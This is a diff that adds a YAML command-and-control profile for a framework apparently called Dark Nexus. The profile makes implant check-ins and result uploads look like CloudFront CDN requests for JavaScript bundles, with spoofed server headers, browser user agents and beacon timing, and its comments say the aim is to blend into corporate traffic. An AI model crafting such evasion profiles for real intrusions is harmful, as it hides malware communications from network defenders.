@@ -1,0 +1,57 @@
+# Dark Nexus C2 Profile: CDN / CloudFront
+# Traffic looks like static asset requests to a CDN
+# Good for corporate environments where CDN traffic is common
+
+name: "cdn-cloudfront"
+description: "Traffic shaped as CloudFront CDN static asset requests"
+
+http:
+  checkin:
+    uri: "/assets/dist/bundle.min.js"
+    method: "POST"
+    headers:
+      Content-Type: "application/javascript"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      Accept-Language: "en-US,en;q=0.5"
+      Accept-Encoding: "gzip, deflate, br"
+      Connection: "keep-alive"
+
+  result:
+    uri: "/assets/dist/analytics.min.js"
+    method: "POST"
+    headers:
+      Content-Type: "application/javascript"
+      Accept: "*/*"
+      Accept-Encoding: "gzip, deflate, br"
+
+  default_page:
+    status: 200
+    headers:
+      Server: "CloudFront"
+      X-Cache: "Hit from cloudfront"
+      X-Amz-Cf-Pop: "IAD79-C3"
+      Via: "1.1 abc123.cloudfront.net (CloudFront)"
+      Content-Type: "text/html; charset=UTF-8"
+    body: |
+      <!DOCTYPE html>
+      <html>
+      <head><title>CDN Edge Node</title></head>
+      <body>
+      <p>CloudFront Distribution</p>
+      </body>
+      </html>
+
+user_agents:
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+beacon:
+  sleep: 10
+  jitter: 30
+  max_retries: 8
+  kill_date: ""
+
+tls:
+  cert: ""
+  key: ""
